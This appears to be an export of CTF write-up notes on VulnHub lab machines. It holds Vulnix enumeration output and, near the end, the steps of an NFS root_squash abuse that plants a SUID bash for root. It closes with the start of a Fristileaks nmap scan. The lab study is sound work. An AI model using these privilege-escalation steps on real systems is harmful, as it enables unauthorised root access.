tty4 Ss+ 15:33 0:00 /sbin/getty -8 38400 tty4 root 963 0.0 0.0 4612 832 tty5 Ss+ 15:33 0:00 /sbin/getty -8 38400 tty5 root 975 0.0 0.0 4612 840 tty2 Ss+ 15:33 0:00 /sbin/getty -8 38400 tty2 root 976 0.0 0.0 4612 844 tty3 Ss+ 15:33 0:00 /sbin/getty -8 38400 tty3 root 979 0.0 0.0 4612 836 tty6 Ss+ 15:33 0:00 /sbin/getty -8 38400 tty6 root 983 0.0 0.0 2412 716 ? S 15:33 0:00 /usr/sbin/inetutils-inetd root 993 0.0 0.1 2992 1196 ? Ss 15:33 0:01 /usr/sbin/dovecot -F -c /etc/dovecot/dovecot.conf root 1000 0.0 0.0 2156 604 ? Ss 15:33 0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket root 1001 0.0 0.0 2600 768 ? Ss 15:33 0:00 cron daemon 1002 0.0 0.0 2452 348 ? Ss 15:33 0:00 atd root 1027 0.0 0.0 3584 636 ? Ss 15:33 0:02 /usr/sbin/irqbalance dovecot 1032 0.0 0.0 2832 976 ? S 15:33 0:00 dovecot/anvil root 1033 0.0 0.0 2820 992 ? S 15:33 0:00 dovecot/log whoopsie 1035 0.0 0.3 24440 3756 ? Ssl 15:33 0:00 whoopsie root 1057 0.0 0.0 0 0 ? S 15:33 0:00 [lockd] root 1058 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [nfsd4] root 1059 0.0 0.0 0 0 ? S\u0026lt; 15:33 0:00 [nfsd4_callbacks] root 1060 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1061 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1062 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1063 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1064 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1065 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1066 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1067 0.0 0.0 0 0 ? S 15:33 0:00 [nfsd] root 1072 0.0 0.1 3568 1748 ? Ss 15:33 0:00 /usr/sbin/rpc.mountd --manage-gids root 1176 0.0 0.1 4560 1464 ? Ss 15:33 0:00 /usr/lib/postfix/master postfix 1179 0.0 0.1 4580 1320 ? S 15:33 0:00 pickup -l -t fifo -u -c postfix 1180 0.0 0.1 4628 1344 ? S 15:33 0:00 qmgr -l -t fifo -u root 1219 0.0 0.0 4612 840 tty1 Ss+ 15:33 0:00 /sbin/getty -8 38400 tty1 postfix 1236 0.0 0.2 7172 2616 ? S 15:37 0:00 tlsmgr -l -t unix -u -c root 9762 0.0 0.0 0 0 ? S 16:10 0:00 [flush-252:0] root 11842 0.0 0.0 0 0 ? S 17:28 0:00 [kworker/u:2] root 12078 0.0 0.0 0 0 ? S 17:34 0:00 [kworker/u:1] root 12079 0.0 0.0 0 0 ? S 17:39 0:00 [kworker/0:0] root 12094 0.0 0.2 9600 3060 ? Ss 17:43 0:00 sshd: vulnix [priv] vulnix 12216 0.0 0.1 9600 1464 ? S 17:43 0:00 sshd: vulnix@pts/0 vulnix 12217 0.5 0.6 9752 6192 pts/0 Ss 17:43 0:00 -bash root 12318 0.0 0.0 0 0 ? S 17:44 0:00 [kworker/0:2] vulnix 12327 3.6 0.1 5600 1632 pts/0 S+ 17:45 0:00 bash vulnix 12328 0.6 0.1 5664 1356 pts/0 S+ 17:45 0:00 bash vulnix 12329 0.0 0.0 4212 588 pts/0 S+ 17:45 0:00 tee -a vulnix 12543 0.0 0.1 5664 1080 pts/0 S+ 17:45 0:00 bash vulnix 12544 0.0 0.1 4924 1156 pts/0 R+ 17:45 0:00 ps aux [-] Process binaries and associated permissions (from above list): 28K -rwxr-xr-x 2 root root 27K Mar 30 2012 /sbin/getty 188K -rwxr-xr-x 1 root root 186K Apr 26 2012 /sbin/init 176K -rwxr-xr-x 1 root root 174K Jul 19 2012 /sbin/udevd 40K -rwxr-xr-x 1 root root 38K Jul 30 2012 /usr/lib/postfix/master 64K -rwxr-xr-x 1 root root 62K Jun 29 2012 /usr/sbin/dovecot 64K -rwxr-xr-x 1 root root 63K Jan 3 2012 /usr/sbin/inetutils-inetd 28K -rwxr-xr-x 1 root root 26K Feb 4 2012 /usr/sbin/irqbalance 260K -rwxr-xr-x 1 root root 257K Apr 9 2012 /usr/sbin/rpc.mountd 516K -rwxr-xr-x 1 root root 516K Apr 2 2012 /usr/sbin/sshd [-] Contents of /etc/inetd.conf: # /etc/inetd.conf: see inetd(8) for further informations. # # Internet superserver configuration database # # # Lines starting with \u0026quot;#:LABEL:\u0026quot; or \u0026quot;#\u0026lt;off\u0026gt;#\u0026quot; should not # be changed unless you know what you are doing! # # If you want to disable an entry so it isn't touched during # package updates just comment it out with a single '#' character. # # Packages should modify this file by using update-inetd(8) # # \u0026lt;service_name\u0026gt; \u0026lt;sock_type\u0026gt; \u0026lt;proto\u0026gt; \u0026lt;flags\u0026gt; \u0026lt;user\u0026gt; \u0026lt;server_path\u0026gt; \u0026lt;args\u0026gt; # #:INTERNAL: Internal services #discard stream tcp nowait root internal #discard dgram udp wait root internal #daytime stream tcp nowait root internal #time stream tcp nowait root internal #:STANDARD: These are standard services. #:BSD: Shell, login, exec and talk are BSD protocols. shell stream tcp nowait root /usr/sbin/tcpd /usr/sbin/in.rshd login stream tcp nowait root /usr/sbin/tcpd /usr/sbin/in.rlogind exec stream tcp nowait root /usr/sbin/tcpd /usr/sbin/in.rexecd #:MAIL: Mail, news and uucp services. #:INFO: Info services finger stream tcp nowait nobody /usr/sbin/tcpd /usr/sbin/in.fingerd #:BOOT: TFTP service is provided primarily for booting. Most sites # run this only on machines acting as \u0026quot;boot servers.\u0026quot; #:RPC: RPC based services #:HAM-RADIO: amateur-radio services #:OTHER: Other services [-] The related inetd binary permissions: -rwxr-xr-x 1 root root 9928 May 9 2010 /usr/sbin/in.fingerd -rwxr-xr-x 1 root root 9968 Jun 26 2010 /usr/sbin/in.rexecd -rwxr-xr-x 1 root root 18268 Jun 26 2010 /usr/sbin/in.rlogind -rwxr-xr-x 1 root root 18580 Jun 26 2010 /usr/sbin/in.rshd [-] /etc/init.d/ binary permissions: total 160 drwxr-xr-x 2 root root 4096 Sep 2 2012 . drwxr-xr-x 91 root root 4096 Jan 5 16:33 .. lrwxrwxrwx 1 root root 21 Dec 8 2011 acpid -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 4596 Apr 12 2012 apparmor lrwxrwxrwx 1 root root 21 Jul 27 2012 apport -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Oct 25 2011 atd -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 2444 Jul 26 2012 bootlogd lrwxrwxrwx 1 root root 21 Apr 19 2012 console-setup -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Jun 19 2012 cron -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Feb 22 2012 dbus -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Mar 30 2012 dmesg -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 1242 Dec 13 2011 dns-clean lrwxrwxrwx 1 root root 21 Jun 29 2012 dovecot -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Mar 14 2012 friendly-recovery -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 1105 May 17 2012 grub-common lrwxrwxrwx 1 root root 21 Apr 9 2012 gssd -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 1329 Jul 26 2012 halt lrwxrwxrwx 1 root root 21 May 26 2011 hostname -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Mar 30 2012 hwclock -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Mar 30 2012 hwclock-save -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 9 2012 idmapd -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 1925 Nov 4 2011 inetutils-inetd lrwxrwxrwx 1 root root 21 Feb 4 2012 irqbalance -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 1293 Jul 26 2012 killprocs -rw-r--r-- 1 root root 0 Sep 2 2012 .legacy-bootordering lrwxrwxrwx 1 root root 21 Nov 20 2011 module-init-tools -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 2797 Feb 13 2012 networking lrwxrwxrwx 1 root root 21 Apr 5 2012 network-interface -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 5 2012 network-interface-container -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 5 2012 network-interface-security -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 4796 Apr 9 2012 nfs-kernel-server -rwxr-xr-x 1 root root 882 Jul 26 2012 ondemand lrwxrwxrwx 1 root root 21 Apr 13 2012 plymouth -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 13 2012 plymouth-log -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 13 2012 plymouth-splash -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 13 2012 plymouth-stop -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 13 2012 plymouth-upstart-bridge -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 May 31 2012 portmap -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 May 31 2012 portmap-wait -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 7355 Jul 30 2012 postfix -rwxr-xr-x 1 root root 561 Feb 4 2011 pppd-dns lrwxrwxrwx 1 root root 21 Dec 12 2011 procps -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 8635 Jul 26 2012 rc -rwxr-xr-x 1 root root 801 Jul 26 2012 rc.local -rwxr-xr-x 1 root root 117 Jul 26 2012 rcS -rw-r--r-- 1 root root 2427 Jul 26 2012 README -rwxr-xr-x 1 root root 639 Jul 26 2012 reboot lrwxrwxrwx 1 root root 21 Jul 21 2012 resolvconf -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 May 31 2012 rpcbind-boot -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 4395 Nov 8 2011 rsync lrwxrwxrwx 1 root root 21 Mar 30 2012 rsyslog -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Jun 6 2011 screen-cleanup -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 4321 Jul 26 2012 sendsigs lrwxrwxrwx 1 root root 21 Apr 19 2012 setvtrgb -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 590 Jul 26 2012 single -rw-r--r-- 1 root root 4304 Jul 26 2012 skeleton -rwxr-xr-x 1 root root 4371 Apr 2 2012 ssh lrwxrwxrwx 1 root root 21 Apr 9 2012 statd -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 9 2012 statd-mounting -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 567 Jul 26 2012 stop-bootlogd -rwxr-xr-x 1 root root 1143 Jul 26 2012 stop-bootlogd-single -rwxr-xr-x 1 root root 700 May 23 2012 sudo rwxrwxrwx 1 root root 21 Jul 19 2012 udev -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Jul 19 2012 udev-fallback-graphics -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Jul 19 2012 udev-finish -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Jul 19 2012 udevmonitor -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Jul 19 2012 udevtrigger -\u0026gt; /lib/init/upstart-job lrwxrwxrwx 1 root root 21 Apr 5 2012 ufw -\u0026gt; /lib/init/upstart-job -rwxr-xr-x 1 root root 2800 Jul 26 2012 umountfs -rwxr-xr-x 1 root root 2211 Jul 26 2012 umountnfs.sh -rwxr-xr-x 1 root root 2926 Jul 26 2012 umountroot -rwxr-xr-x 1 root root 1985 Jul 26 2012 urandom lrwxrwxrwx 1 root root 21 Apr 18 2012 whoopsie -\u0026gt; /lib/init/upstart-job [-] /etc/init/ config file permissions: total 300 drwxr-xr-x 2 root root 4096 Sep 2 2012 . drwxr-xr-x 91 root root 4096 Jan 5 16:33 .. -rw-r--r-- 1 root root 320 Dec 8 2011 acpid.conf -rw-r--r-- 1 root root 1309 Jul 27 2012 apport.conf -rw-r--r-- 1 root root 261 Oct 25 2011 atd.conf -rw-r--r-- 1 root root 266 Apr 26 2012 console.conf -rw-r--r-- 1 root root 509 Dec 21 2010 console-setup.conf -rw-r--r-- 1 root root 1122 Apr 26 2012 container-detect.conf -rw-r--r-- 1 root root 356 Apr 26 2012 control-alt-delete.conf -rw-r--r-- 1 root root 297 Jun 19 2012 cron.conf -rw-r--r-- 1 root root 510 Jan 10 2012 dbus.conf -rw-r--r-- 1 root root 273 Mar 30 2012 dmesg.conf -rw-r--r-- 1 root root 1096 Jun 28 2012 dovecot.conf -rw-r--r-- 1 root root 1377 Apr 26 2012 failsafe.conf -rw-r--r-- 1 root root 267 Apr 26 2012 flush-early-job-log.conf -rw-r--r-- 1 root root 1247 Mar 14 2012 friendly-recovery.conf -rw-r--r-- 1 root root 1985 Mar 27 2012 gssd.conf -rw-r--r-- 1 root root 317 May 26 2011 hostname.conf -rw-r--r-- 1 root root 557 Mar 30 2012 hwclock.conf -rw-r--r-- 1 root root 444 Mar 30 2012 hwclock-save.conf -rw-r--r-- 1 root root 976 Mar 27 2012 idmapd.conf -rw-r--r-- 1 root root 571 Feb 4 2012 irqbalance.conf -rw-r--r-- 1 root root 367 Mar 18 2011 module-init-tools.conf -rw-r--r-- 1 root root 943 Apr 12 2012 mountall.conf -rw-r--r-- 1 root root 349 Apr 12 2012 mountall-net.conf -rw-r--r-- 1 root root 261 Apr 12 2012 mountall-reboot.conf -rw-r--r-- 1 root root 1201 Apr 12 2012 mountall-shell.conf -rw-r--r-- 1 root root 405 Apr 12 2012 mounted-debugfs.conf -rw-r--r-- 1 root root 550 Apr 12 2012 mounted-dev.conf -rw-r--r-- 1 root root 480 Apr 12 2012 mounted-proc.conf -rw-r--r-- 1 root root 610 Apr 12 2012 mounted-run.conf -rw-r--r-- 1 root root 1890 Apr 12 2012 mounted-tmp.conf -rw-r--r-- 1 root root 903 Apr 12 2012 mounted-var.conf -rw-r--r-- 1 root root 388 Apr 5 2012 networking.conf -rw-r--r-- 1 root root 803 Apr 5 2012 network-interface.conf -rw-r--r-- 1 root root 523 Apr 5 2012 network-interface-container.conf -rw-r--r-- 1 root root 1603 Apr 5 2012 network-interface-security.conf -rw-r--r-- 1 root root 971 Nov 9 2011 plymouth.conf -rw-r--r-- 1 root root 326 Mar 26 2010 plymouth-log.conf -rw-r--r-- 1 root root 899 Mar 18 2011 plymouth-splash.conf -rw-r--r-- 1 root root 800 Apr 13 2012 plymouth-stop.conf -rw-r--r-- 1 root root 367 Jan 25 2011 plymouth-upstart-bridge.conf -rw-r--r-- 1 root root 853 May 30 2012 portmap.conf -rw-r--r-- 1 root root 805 May 30 2012 portmap-wait.conf -rw-r--r-- 1 root root 363 Dec 5 2011 procps.conf -rw-r--r-- 1 root root 454 Apr 26 2012 rc.conf -rw-r--r-- 1 root root 705 Apr 26 2012 rcS.conf -rw-r--r-- 1 root root 1543 Apr 26 2012 rc-sysinit.conf -rw-r--r-- 1 root root 457 Jul 18 2012 resolvconf.conf -rw-r--r-- 1 root root 209 May 30 2012 rpcbind-boot.conf -rw-r--r-- 1 root root 426 Mar 30 2012 rsyslog.conf -rw-r--r-- 1 root root 683 Jun 6 2011 screen-cleanup.conf -rw-r--r-- 1 root root 230 Mar 18 2011 setvtrgb.conf -rw-r--r-- 1 root root 277 Apr 26 2012 shutdown.conf -rw-r--r-- 1 root root 667 Feb 6 2012 ssh.conf -rw-r--r-- 1 root root 1188 Mar 27 2012 statd.conf -rw-r--r-- 1 root root 738 Mar 27 2012 statd-mounting.conf -rw-r--r-- 1 root root 348 Apr 26 2012 tty1.conf -rw-r--r-- 1 root root 333 Apr 26 2012 tty2.conf -rw-r--r-- 1 root root 333 Apr 26 2012 tty3.conf -rw-r--r-- 1 root root 333 Apr 26 2012 tty4.conf -rw-r--r-- 1 root root 232 Apr 26 2012 tty5.conf -rw-r--r-- 1 root root 232 Apr 26 2012 tty6.conf -rw-r--r-- 1 root root 322 Nov 15 2011 udev.conf -rw-r--r-- 1 root root 637 Jul 16 2012 udev-fallback-graphics.conf -rw-r--r-- 1 root root 769 Oct 21 2011 udev-finish.conf -rw-r--r-- 1 root root 356 Oct 21 2011 udevmonitor.conf -rw-r--r-- 1 root root 352 Jul 16 2012 udevtrigger.conf -rw-r--r-- 1 root root 473 Apr 5 2012 ufw.conf -rw-r--r-- 1 root root 329 Apr 26 2012 upstart-socket-bridge.conf -rw-r--r-- 1 root root 553 Apr 26 2012 upstart-udev-bridge.conf -rw-r--r-- 1 root root 889 Feb 4 2012 ureadahead.conf -rw-r--r-- 1 root root 683 Feb 4 2012 ureadahead-other.conf -rw-r--r-- 1 root root 1481 Apr 26 2012 wait-for-state.conf -rw-r--r-- 1 root root 362 Apr 18 2012 whoopsie.conf [-] /lib/systemd/* config file permissions: /lib/systemd/: total 4.0K drwxr-xr-x 6 root root 4.0K Sep 2 2012 system /lib/systemd/system: total 56K drwxr-xr-x 2 root root 4.0K Sep 2 2012 dbus.target.wants drwxr-xr-x 2 root root 4.0K Sep 2 2012 multi-user.target.wants drwxr-xr-x 2 root root 4.0K Sep 2 2012 sockets.target.wants drwxr-xr-x 2 root root 4.0K Sep 2 2012 basic.target.wants -rw-r--r-- 1 root root 433 Aug 2 2012 accounts-daemon.service -rw-r--r-- 1 root root 164 Jul 19 2012 udev-control.socket -rw-r--r-- 1 root root 177 Jul 19 2012 udev-kernel.socket -rw-r--r-- 1 root root 341 Jul 19 2012 udev.service -rw-r--r-- 1 root root 752 Jul 19 2012 udev-settle.service -rw-r--r-- 1 root root 291 Jul 19 2012 udev-trigger.service -rw-r--r-- 1 root root 231 Mar 30 2012 rsyslog.service -rw-r--r-- 1 root root 419 Feb 22 2012 dbus.service -rw-r--r-- 1 root root 106 Feb 22 2012 dbus.socket -rw-r--r-- 1 root root 188 Nov 8 2011 rsync.service /lib/systemd/system/dbus.target.wants: total 0 lrwxrwxrwx 1 root root 14 Feb 22 2012 dbus.socket -\u0026gt; ../dbus.socket /lib/systemd/system/multi-user.target.wants: total 0 lrwxrwxrwx 1 root root 15 Feb 22 2012 dbus.service -\u0026gt; ../dbus.service /lib/systemd/system/sockets.target.wants: total 0 lrwxrwxrwx 1 root root 22 Jul 19 2012 udev-control.socket -\u0026gt; ../udev-control.socket lrwxrwxrwx 1 root root 21 Jul 19 2012 udev-kernel.socket -\u0026gt; ../udev-kernel.socket lrwxrwxrwx 1 root root 14 Feb 22 2012 dbus.socket -\u0026gt; ../dbus.socket /lib/systemd/system/basic.target.wants: total 0 lrwxrwxrwx 1 root root 15 Jul 19 2012 udev.service -\u0026gt; ../udev.service lrwxrwxrwx 1 root root 23 Jul 19 2012 udev-trigger.service -\u0026gt; ../udev-trigger.service #### SOFTWARE ################################################################### [-] Sudo version: Sudo version 1.8.3p1 #### INTERESTING FILES ###################################################### [-] Useful file locations: /bin/nc /bin/netcat /usr/bin/wget /usr/bin/curl [-] Can we read/write sensitive files: -rw-r--r-- 1 root root 1312 Sep 2 2012 /etc/passwd -rw-r--r-- 1 root root 720 Sep 2 2012 /etc/group -rw-r--r-- 1 root root 665 Sep 2 2012 /etc/profile -rw-r----- 1 root shadow 1111 Sep 2 2012 /etc/shadow [-] SUID files: -rwsr-xr-x 1 root root 96904 Apr 9 2012 /sbin/mount.nfs -rwsr-sr-x 1 libuuid libuuid 17976 Mar 30 2012 /usr/sbin/uuidd -rwsr-xr-- 1 root dip 273272 Feb 4 2011 /usr/sbin/pppd -rwsr-xr-x 1 root root 5564 Dec 13 2011 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-- 1 root messagebus 316824 Feb 22 2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 248056 Apr 2 2012 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 9728 Apr 20 2012 /usr/lib/pt_chown -rwsr-xr-x 1 root root 56208 Jul 28 2011 /usr/bin/mtr -rwsr-xr-x 2 root root 69708 Jun 1 2012 /usr/bin/sudo -rwsr-xr-x 1 root root 30896 Apr 9 2012 /usr/bin/newgrp -rwsr-xr-x 1 root root 41284 Apr 9 2012 /usr/bin/passwd -rwsr-xr-x 1 root root 40292 Apr 9 2012 /usr/bin/chfn -rwsr-sr-x 1 daemon daemon 42800 Oct 25 2011 /usr/bin/at -rwsr-xr-x 2 root root 69708 Jun 1 2012 /usr/bin/sudoedit -rwsr-xr-x 1 root root 14012 Nov 8 2011 /usr/bin/traceroute6.iputils -rwsr-xr-x 1 root root 57956 Apr 9 2012 /usr/bin/gpasswd -rwsr-xr-x 1 root root 31748 Apr 9 2012 /usr/bin/chsh -rwsr-sr-x 1 root mail 75600 Aug 4 2010 /usr/bin/procmail -rwsr-xr-x 1 root root 39116 Nov 8 2011 /bin/ping6 -rwsr-xr-x 1 root root 88760 Mar 30 2012 /bin/mount -rwsr-xr-x 1 root root 67720 Mar 30 2012 /bin/umount -rwsr-xr-x 1 root root 31116 Apr 9 2012 /bin/su -rwsr-xr-x 1 root root 34740 Nov 8 2011 /bin/ping -rwsr-xr-x 1 root root 26252 Mar 2 2012 /bin/fusermount [-] SGID files: -rwxr-sr-x 1 root shadow 30364 Feb 9 2012 /sbin/unix_chkpwd -rwsr-sr-x 1 libuuid libuuid 17976 Mar 30 2012 /usr/sbin/uuidd -r-xr-sr-x 1 root postdrop 13624 Jul 30 2012 /usr/sbin/postdrop -r-xr-sr-x 1 root postdrop 13608 Jul 30 2012 /usr/sbin/postqueue -rwxr-sr-x 1 root ssh 128416 Apr 2 2012 /usr/bin/ssh-agent -rwxr-sr-x 1 root shadow 18120 Apr 9 2012 /usr/bin/expiry -rwxr-sr-x 3 root mail 9684 Oct 18 2011 /usr/bin/mail-touchlock -rwxr-sr-x 3 root mail 9684 Oct 18 2011 /usr/bin/mail-unlock -rwxr-sr-x 1 root mail 13708 Aug 4 2010 /usr/bin/lockfile -rwxr-sr-x 1 root mail 9720 Jan 10 2012 /usr/bin/mutt_dotlock -rwsr-sr-x 1 daemon daemon 42800 Oct 25 2011 /usr/bin/at -rwxr-sr-x 1 root mail 13932 Oct 17 2011 /usr/bin/dotlockfile -rwxr-sr-x 1 root tty 18036 Mar 30 2012 /usr/bin/wall -rwxr-sr-x 1 root shadow 45284 Apr 9 2012 /usr/bin/chage -rwxr-sr-x 1 root tty 9728 Mar 31 2012 /usr/bin/bsd-write -rwxr-sr-x 3 root mail 9684 Oct 18 2011 /usr/bin/mail-lock -rwxr-sr-x 1 root crontab 34776 Jun 19 2012 /usr/bin/crontab -rwxr-sr-x 1 root utmp 365260 Jun 6 2011 /usr/bin/screen -rwxr-sr-x 1 root mlocate 34432 Aug 17 2011 /usr/bin/mlocate -rwsr-sr-x 1 root mail 75600 Aug 4 2010 /usr/bin/procmail [+] Hosts.equiv file and contents: -rw-r--r-- 1 root root 117 Jun 26 2010 /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted \u0026quot;trusted\u0026quot; r # command access to your system . -] NFS config details: -rw-r--r-- 1 root root 420 Sep 2 2012 /etc/exports # /etc/exports: the access control list for filesystems which may be exported # to NFS clients. See exports(5). # # Example for NFSv2 and NFSv3: # /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check) # # Example for NFSv4: # /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check) # /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check) # /home/vulnix *(rw,root_squash) [-] Can't search *.conf files as no keyword was entered [-] Can't search *.php files as no keyword was entered [-] Can't search *.log files as no keyword was entered [-] Can't search *.ini files as no keyword was entered [-] All *.conf files in /etc (recursive 1 level): -rw-r----- 1 root fuse 216 Oct 18 2011 /etc/fuse.conf -rw-r--r-- 1 root root 834 Dec 16 2011 /etc/gssapi_mech.conf -rw-r--r-- 1 root root 144 Sep 2 2012 /etc/kernel-img.conf -rw-r--r-- 1 root root 839 Apr 10 2012 /etc/insserv.conf -rw-r--r-- 1 root root 326 Aug 17 2011 /etc/updatedb.conf -rw-r--r-- 1 root root 956 Mar 30 2012 /etc/mke2fs.conf -rw-r--r-- 1 root root 552 Feb 9 2012 /etc/pam.conf -rw-r--r-- 1 root root 350 Sep 2 2012 /etc/popularity-contest.conf -rw-r--r-- 1 root root 2083 Dec 5 2011 /etc/sysctl.conf -rw-r--r-- 1 root root 15752 Jul 25 2009 /etc/ltrace.conf -rw-r--r-- 1 root root 1318 Sep 2 2012 /etc/inetd.conf -rw-r--r-- 1 root root 2969 Mar 15 2012 /etc/debconf.conf -rw-r--r-- 1 root root 34 Sep 2 2012 /etc/ld.so.conf -rw-r--r-- 1 root root 206 Mar 27 2012 /etc/idmapd.conf -rw-r--r-- 1 root root 4728 May 2 2012 /etc/hdparm.conf -rw-r--r-- 1 root root 3343 Apr 20 2012 /etc/gai.conf -rw-r--r-- 1 root root 599 Oct 4 2011 /etc/logrotate.conf -rw-r--r-- 1 root root 1260 May 2 2011 /etc/ucf.conf -rw-r--r-- 1 root root 6961 Sep 2 2012 /etc/ca-certificates.conf -rw-r--r-- 1 root root 92 Apr 19 2012 /etc/host.conf -rw-r--r-- 1 root root 1263 Mar 30 2012 /etc/rsyslog.conf -rw-r--r-- 1 root root 475 Apr 19 2012 /etc/nsswitch.conf -rw-r--r-- 1 root root 321 Mar 30 2012 /etc/blkid.conf -rw-r--r-- 1 root root 604 Oct 19 2011 /etc/deluser.conf -rw-r--r-- 1 root root 2981 Sep 2 2012 /etc/adduser.conf [-] Any interesting mail in /var/mail: total 8 drwxrwsr-x 2 root mail 4096 Sep 2 2012 . drwxr-xr-x 12 root root 4096 Sep 2 2012 .. #### SCAN COMPLETE ###################################################### sudoedit /etc/exports # Disable root_squash with root_squash and reboot the vm  root@kali:~/Documents/vulnix# umount mountme root@kali:~/Documents/vulnix# mount -o vers=3,nolock -t nfs 192.168.88.134:/home/vulnix /root/Documents/vulnix/mountme/ root@kali:~/Documents/vulnix# cd mountme root@kali:~/Documents/vulnix/mountm# cp /bin/bash bash root@kali:~/Documents/vulnix/mountm# chmod 4777 bash root@kali:~/Documents/vulnix/mountm# su vulnix $ bash vulnix@kali:/root/Documents/vulnix$ ssh 192.168.88.134 -i /tmp/key vulnix@vulnix:~$ ./bash bash: ./bash: cannot execute binary file vulnix@vulnix:~$ cp /bin/bash . vulnix@kali:/root/Documents/vulnix$ exit root@kali:~/Documents/vulnix# chmod 4777 bash root@kali:~/Documents/vulnix# chown root:root bash root@kali:~/Documents/vulnix# su vulnix vulnix@kali:/root/Documents/vulnix/mountme$ ssh 192.168.88.134 -i /tmp/key vulnix@vulnix:~$ ./bash bash-4.2$ whoami vulnix bash-4.2$ exit exit vulnix@vulnix:~$ ./bash -p bash-4.2# whoami root bash-4.2# cat /root/trophy.txt cc614640424f5bd60ce5d5264899c3be  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/fristileaks/",
	"title": "Fristileaks",
	"tags": ["VulnHub"],
	"description": "Notes from the Fristileaks machine from Vulnhub.",
	"content": "fristileaks    Proto port Service/URL Info Potential Vulns Verified Vulns    where you at nmap -sn -PR 192.168.88.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 23:39 CET Nmap scan report for 192.168.88.2 Host is up (0.00052s latency). MAC Address: 00:50:56:FE:4E:C1 (VMware) Nmap scan report for 192.168.88.133 Host is up (0.00067s latency). MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.88.254 Host is up (0.00060s latency). MAC Address: 00:50:56:F7:8F:D0 (VMware) Nmap scan report for 192.168.88.128 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds  what you got tcp   Related files   tcp.nmap  (1 kb)    nmap -p- -A 192.168.88.133 -oA tcp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 23:41 CET Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan NSE Timing: About 0.00% done Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 11.73% done; ETC: 23:44 (0:02:53 remaining) Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 81.78% done; ETC: 23:43 (0:00:28 remaining) Nmap scan report for 192.168.88.133 Host is up (0.00061s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3) | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 3 disallowed entries |_/cola /sisi /beer |_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 2.6.X|3.X OS CPE: cpe:/o:linux:linux_kernel:2.6.32 